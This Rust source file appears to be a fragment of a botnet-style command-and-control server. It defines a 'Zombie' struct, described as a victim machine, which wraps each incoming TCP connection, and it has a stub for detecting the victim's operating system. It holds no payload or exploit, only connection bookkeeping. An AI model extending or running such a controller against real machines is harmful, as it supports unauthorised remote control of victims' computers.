use std::fmt::Debug;
use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
use log::debug;

#[derive(Debug)]
pub enum System {
    Windows,
    Linux,
    MacOS,
    NotFound
}

/// Zombie is victim machine.
#[derive(Debug)]
pub struct Zombie {
    pub system: System,
    pub ip: IpAddr,
    pub port: u16,
    tcp_stream: TcpStream
}

/// TODO: Find system after connection
fn find_system(connection: &mut TcpStream) -> System {
    System::NotFound // Not implemented yet
}
impl Zombie {
    pub fn new(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
        Ok(
            Zombie {
                system: find_system(&mut connection),
                ip: connection.peer_addr()?.ip(),
                port: connection.peer_addr()?.port(),
                tcp_stream: connection
            }
        )
    }
}



pub fn craft_zombie(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
    debug!("Caught connection! {connection:?}");
    Zombie::new(connection)
}